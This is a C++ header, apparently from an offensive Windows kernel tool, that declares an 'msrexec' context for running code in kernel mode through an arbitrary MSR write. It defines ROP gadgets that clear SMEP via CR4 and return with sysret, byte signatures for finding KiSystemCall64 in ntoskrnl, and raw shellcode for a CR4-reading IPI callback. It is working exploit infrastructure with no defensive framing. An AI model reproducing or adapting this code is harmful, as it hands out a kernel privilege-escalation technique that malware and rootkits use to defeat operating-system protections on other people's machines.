#pragma once
#include "utils.hpp"
#include "syscall_handler.h"
#include <intrin.h>

#define IA32_LSTAR_MSR 0xC0000082
#define MOV_CR4_GADGET "\x0F\x22\xE1\xC3"
#define POP_RCX_GADGET "\x59\xc3"
#define SYSRET_GADGET  "\x48\x0F\x07"

// not sure how far back this signature goes... works on 1507 though....
#define KI_SYSCALL_SIG "\x0F\x01\xF8\x65\x48\x89\x24\x25\x00\x00\x00\x00\x65\x48\x8B\x24\x25\x00\x00\x00\x00\x6A\x2B\x65\xFF\x34\x25\x00\x00\x00\x00\x41\x53\x6A\x00\x51\x49\x8B\xCA"
#define KI_SYSCALL_MASK "xxxxxxxx????xxxxx????xxxxxx????xxx?xxxx"
static_assert(sizeof KI_SYSCALL_SIG == sizeof KI_SYSCALL_MASK, "signature/mask invalid size...");

#define KI_SYSCALL_SHADOW_SIG "\x0F\x01\xF8\x65\x48\x89\x24\x25\x00\x00\x00\x00\x65\x48\x8B\x24\x25\x00\x00\x00\x00\x65\x0F\xBA\x24\x25\x00\x00\x00\x00\x00\x72\x03\x0F\x22\xDC"
#define KI_SYSCALL_SHADOW_MASK "xxxxxxxx????xxxxx????xxxxx?????xxxxx"
static_assert(sizeof KI_SYSCALL_SHADOW_SIG == sizeof KI_SYSCALL_SHADOW_MASK);

using get_system_routine_t = void* (*)(void*, const char*);
using callback_t = std::function<void(void*, get_system_routine_t)>;
using thread_info_t = std::pair<std::uint32_t, std::uint32_t>;
using writemsr_t = std::function<bool(std::uint32_t, std::uintptr_t)>;

struct _ipi_data
{
	std::uint32_t core_num;
	std::uint64_t cr4_val;
};

using ex_alloc_t = void* (*)(unsigned, unsigned);
using ex_free_t = void (*)(void*);
using ipi_call_t = void (*)(void*, _ipi_data*);

extern "C" void msrexec_handler(callback_t* callback);
inline get_system_routine_t get_system_routine = nullptr;
inline void* ntoskrnl_base = nullptr;

inline std::uint8_t ipi_callback[] = 
{
	0x48, 0x89, 0x4C, 0x24, 0x08, 0x53, 0x48, 0x83, 0xEC, 0x20, 0xB8, 0x01,
	0x00, 0x00, 0x00, 0x33, 0xC9, 0x0F, 0xA2, 0x4C, 0x8D, 0x44, 0x24, 0x08,
	0x41, 0x89, 0x00, 0x41, 0x89, 0x58, 0x04, 0x41, 0x89, 0x48, 0x08, 0x41,
	0x89, 0x50, 0x0C, 0x8B, 0x44, 0x24, 0x0C, 0xC1, 0xE8, 0x18, 0x25, 0xFF,
	0x00, 0x00, 0x00, 0x89, 0x04, 0x24, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x8B,
	0x0C, 0x24, 0x39, 0x08, 0x75, 0x02, 0xEB, 0x0C, 0x0F, 0x20, 0xE0, 0x48,
	0x8B, 0x4C, 0x24, 0x30, 0x48, 0x89, 0x41, 0x08, 0x48, 0x83, 0xC4, 0x20,
	0x5B, 0xC3
};

namespace vdm
{
	class msrexec_ctx
	{
	public:
		explicit msrexec_ctx(writemsr_t wrmsr);
		void exec(callback_t kernel_callback);
		void set_wrmsr(writemsr_t wrmsr);
		auto get_wrmsr() -> writemsr_t const;
	private:
		auto guess_cr4_value()->cr4;
		auto find_gadgets() -> bool;
		auto find_globals() -> bool;
		writemsr_t wrmsr;
	};
}